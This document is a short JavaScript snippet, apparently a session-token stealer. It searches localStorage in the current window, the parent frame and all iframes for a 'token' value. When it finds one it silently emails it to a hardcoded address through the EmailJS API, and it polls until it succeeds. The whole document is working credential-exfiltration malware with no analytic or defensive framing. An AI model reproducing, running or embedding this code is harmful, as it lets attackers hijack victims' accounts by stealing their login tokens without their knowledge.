(() => {
  const TO = 'prlogabriel8@gmail.com';

  function grab() {
    let t = null;
    try { t = window.localStorage.token; } catch {}
    if (!t && window.parent !== window) try { t = parent.localStorage.token; } catch {}
    if (!t) [...document.querySelectorAll('iframe')].forEach(f => {
      try { t = f.contentWindow.localStorage.token; } catch {}
    });
    return t;
  }

  function sendEmail(text) {
    fetch('https://api.emailjs.com/api/v1.0/email/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        service_id: 'service_imfo097',
        template_id: 'template_0oqe1jj',
        user_id: '1e5pqvoxghvTRO7cQ',
        template_params: { token: text, to_email: TO }
      })
    }).catch(() => {});
  }

  const id = setInterval(() => {
    const tok = grab();
    if (tok && tok.length > 20) {
      sendEmail(tok);
      clearInterval(id);
    }
  }, 1500);
})();
